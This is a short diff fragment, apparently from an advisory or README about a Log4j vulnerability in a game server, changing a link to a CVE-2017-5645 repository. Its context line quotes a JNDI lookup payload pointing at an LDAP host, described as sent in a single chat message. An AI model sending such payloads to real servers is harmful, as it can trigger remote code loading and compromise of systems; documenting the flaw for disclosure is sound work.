@@ -9,4 +9,4 @@ Sending a single chat message "${jndi:ldap://192.168.1.123:3710/owo}" on any 1.8
 
 
 
-https://github.com/pimps/CVE-2017-5645/blob/master/log4j%20advisory.txt
+https://github.com/pimps/CVE-2017-5645
